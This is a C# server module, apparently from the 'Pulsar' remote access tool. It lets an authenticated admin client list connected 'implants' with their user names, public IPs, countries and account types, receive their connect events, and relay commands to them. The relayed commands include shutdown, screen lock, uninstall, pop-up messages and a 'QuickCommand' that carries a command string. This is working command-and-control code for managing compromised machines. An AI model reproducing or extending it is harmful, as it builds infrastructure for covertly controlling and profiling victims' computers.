using Pulsar.Common.Messages;
using Pulsar.Common.Messages.AdminRelay;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using Pulsar.Server.Operations;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Implements permissioned clients (roadmap): a lightweight admin client can connect to the
    /// server, authenticate with the configured admin key and manage the other connected
    /// clients — list them, receive connect/disconnect events and relay a whitelisted set of
    /// commands to them — without running the full server UI.
    /// Admin clients are regular identified clients that additionally completed
    /// <see cref="AdminIdentification"/>; they are excluded from the managed client list.
    /// </summary>
    public class AdminRelayHandler : MessageProcessorBase<object>, IDisposable
    {
        private readonly Func<PulsarServer> _getServer;
        private readonly Action<string, string> _log;
        private readonly ClientOperationService _operations;
        private readonly ConcurrentDictionary<Client, byte> _admins = new ConcurrentDictionary<Client, byte>();
        private readonly ConcurrentDictionary<Client, int> _authenticationFailures = new ConcurrentDictionary<Client, int>();
        private const int MaxAuthenticationFailures = 3;
        private const int MaxRelayParameterLength = 256 * 1024;
        private int _serverEventsSubscribed;

        public AdminRelayHandler(Func<PulsarServer> getServer, Action<string, string> log)
            : this(getServer, log, null)
        {
        }

        public AdminRelayHandler(Func<PulsarServer> getServer, Action<string, string> log,
            ClientOperationService operations) : base(true)
        {
            _getServer = getServer ?? throw new ArgumentNullException(nameof(getServer));
            _log = log;
            _operations = operations ?? new ClientOperationService(
                () => _getServer()?.ConnectedClients, _log);
        }

        public override bool CanExecute(IMessage message) => message is AdminIdentification
                                                             || message is GetAdminClientList
                                                             || message is DoAdminRelay;

        public override bool CanExecuteFrom(ISender sender) => sender is Client;

        public override void Execute(ISender sender, IMessage message)
        {
            if (sender is Client client)
            {
                switch (message)
                {
                    case AdminIdentification msg:
                        Execute(client, msg);
                        break;
                    case GetAdminClientList msg:
                        Execute(client, msg);
                        break;
                    case DoAdminRelay msg:
                        Execute(client, msg);
                        break;
                }
            }
        }

        private void Execute(Client client, AdminIdentification message)
        {
            string configuredKey = Settings.AdminClientKey;

            if (string.IsNullOrWhiteSpace(configuredKey))
            {
                client.Send(new AdminIdentificationResult
                {
                    Accepted = false,
                    DeniedReason = "no admin key configured on the server"
                });
                _log?.Invoke("[Admin] Rejected admin authentication because no key is configured.", "error");
                return;
            }

            byte[] expected = SHA256.HashData(Encoding.UTF8.GetBytes(configuredKey));
            byte[] provided = ParseHex(message.AdminKeyHash);

            if (provided == null || !CryptographicOperations.FixedTimeEquals(provided, expected))
            {
                var failures = _authenticationFailures.AddOrUpdate(client, 1, (_, count) => count + 1);
                client.Send(new AdminIdentificationResult
                {
                    Accepted = false,
                    DeniedReason = "invalid admin key"
                });
                _log?.Invoke("[Admin] Rejected invalid admin authentication.", "error");
                if (failures >= MaxAuthenticationFailures)
                    client.Disconnect();
                return;
            }

            _authenticationFailures.TryRemove(client, out _);
            _admins[client] = 1;
            EnsureServerEventsSubscribed();

            // mark the connection in the server UI so it is visually distinct from implants
            client.Value.Tag = "ADMIN";

            client.Send(new AdminIdentificationResult
            {
                Accepted = true,
                Clients = GetManagedClients()
            });

            _log?.Invoke("[Admin] Admin client authenticated.", "normal");
        }

        private void Execute(Client client, GetAdminClientList message)
        {
            if (!IsAdmin(client))
            {
                client.Disconnect();
                return;
            }

            client.Send(new GetAdminClientListResponse
            {
                Clients = GetManagedClients()
            });
        }

        private void Execute(Client client, DoAdminRelay message)
        {
            if (!IsAdmin(client))
            {
                client.Disconnect();
                return;
            }

            if (!MessageInputLimits.IsValidClientId(message?.TargetId) || message.Command == AdminRelayCommand.None ||
                (message.Param1?.Length ?? 0) > MaxRelayParameterLength ||
                (message.Param2?.Length ?? 0) > MaxRelayParameterLength)
            {
                client.Send(new AdminRelayResult
                {
                    TargetId = message?.TargetId,
                    Accepted = false,
                    Reason = "target id and command are required"
                });
                return;
            }

            var target = FindManagedClient(message.TargetId);
            if (target == null)
            {
                client.Send(new AdminRelayResult
                {
                    TargetId = message.TargetId,
                    Accepted = false,
                    Reason = "target client not found"
                });
                return;
            }

            ClientOperationResult operationResult;
            try
            {
                operationResult = _operations.Execute(CreateOperationRequest(message), "admin relay");
            }
            catch (Exception ex)
            {
                _log?.Invoke($"[Admin] Relay failed with {ex.GetType().Name}.", "error");
                operationResult = ClientOperationResult.Create(
                    message.TargetId, ClientOperation.None, ClientOperationStatus.Failed,
                    "operation failed");
            }

            client.Send(new AdminRelayResult
            {
                TargetId = message.TargetId,
                Accepted = operationResult.Accepted,
                Reason = operationResult.Accepted ? null : operationResult.Error ?? "unsupported command"
            });
        }

        /// <summary>
        /// Maps the wire-compatible admin command enum into the shared operation request.
        /// </summary>
        private static ClientOperationRequest CreateOperationRequest(DoAdminRelay message)
        {
            var operation = message.Command switch
            {
                AdminRelayCommand.Shutdown => ClientOperation.Shutdown,
                AdminRelayCommand.Restart => ClientOperation.Restart,
                AdminRelayCommand.Standby => ClientOperation.Standby,
                AdminRelayCommand.Lockscreen => ClientOperation.Lockscreen,
                AdminRelayCommand.Reconnect => ClientOperation.Reconnect,
                AdminRelayCommand.Disconnect => ClientOperation.Disconnect,
                AdminRelayCommand.Uninstall => ClientOperation.Uninstall,
                AdminRelayCommand.MessageBox => ClientOperation.MessageBox,
                AdminRelayCommand.QuickCommand => ClientOperation.QuickCommand,
                _ => ClientOperation.None
            };

            return new ClientOperationRequest
            {
                ClientId = message.TargetId,
                Operation = operation,
                Caption = string.IsNullOrEmpty(message.Param1) ? "Pulsar" : message.Param1,
                Text = message.Param2,
                Button = "OK",
                Icon = "Information",
                Command = message.Param1,
                Host = message.Param2
            };
        }

        private bool IsAdmin(Client client) => _admins.ContainsKey(client);

        private AdminClientInfo[] GetManagedClients()
        {
            var server = _getServer();
            if (server == null)
                return Array.Empty<AdminClientInfo>();

            return server.ConnectedClients
                .Where(c => !_admins.ContainsKey(c) && c.Value != null)
                .Select(ProjectInfo)
                .ToArray();
        }

        private Client FindManagedClient(string id)
        {
            var server = _getServer();
            if (server == null)
                return null;

            return server.ConnectedClients.FirstOrDefault(c =>
                !_admins.ContainsKey(c)
                && string.Equals(c.Value?.Id, id, StringComparison.OrdinalIgnoreCase));
        }

        private static AdminClientInfo ProjectInfo(Client c) => new AdminClientInfo
        {
            Id = c.Value?.Id,
            UserAtPc = c.Value?.UserAtPc,
            Tag = c.Value?.Tag,
            PublicIp = c.Value?.PublicIP,
            Country = c.Value?.Country,
            OperatingSystem = c.Value?.OperatingSystem,
            AccountType = c.Value?.AccountType,
            Version = c.Value?.Version
        };

        private void EnsureServerEventsSubscribed()
        {
            var server = _getServer();
            if (server == null || System.Threading.Interlocked.Exchange(ref _serverEventsSubscribed, 1) == 1)
                return;

            server.ClientConnected += ServerOnClientConnected;
            server.ClientDisconnected += ServerOnClientDisconnected;
        }

        private void ServerOnClientConnected(Client client)
        {
            PushClientEvent(client, true);
        }

        private void ServerOnClientDisconnected(Client client)
        {
            bool wasAdmin = _admins.TryRemove(client, out _);
            _authenticationFailures.TryRemove(client, out _);
            if (!wasAdmin)
            {
                PushClientEvent(client, false);
            }
        }

        private void PushClientEvent(Client client, bool connected)
        {
            // admin clients are management surfaces, not managed targets
            if (_admins.ContainsKey(client))
                return;

            var info = ProjectInfo(client);
            foreach (var admin in _admins.Keys)
            {
                try
                {
                    admin.Send(new AdminClientEvent { Connected = connected, Client = info });
                }
                catch
                {
                    // admin connection dropped; it will be removed on its disconnect event
                }
            }
        }

        private static byte[] ParseHex(string hex)
        {
            if (string.IsNullOrEmpty(hex) || hex.Length != 64)
                return null;

            var bytes = new byte[32];
            for (int i = 0; i < bytes.Length; i++)
            {
                if (!byte.TryParse(hex.AsSpan(i * 2, 2), System.Globalization.NumberStyles.HexNumber, null, out bytes[i]))
                    return null;
            }

            return bytes;
        }

        private static string ShortId(string id)
        {
            return string.IsNullOrEmpty(id) ? "unknown client" : id.Substring(0, Math.Min(8, id.Length));
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing) return;

            var server = _getServer();
            if (server != null)
            {
                server.ClientConnected -= ServerOnClientConnected;
                server.ClientDisconnected -= ServerOnClientDisconnected;
            }

            _admins.Clear();
            _authenticationFailures.Clear();
        }
    }
}
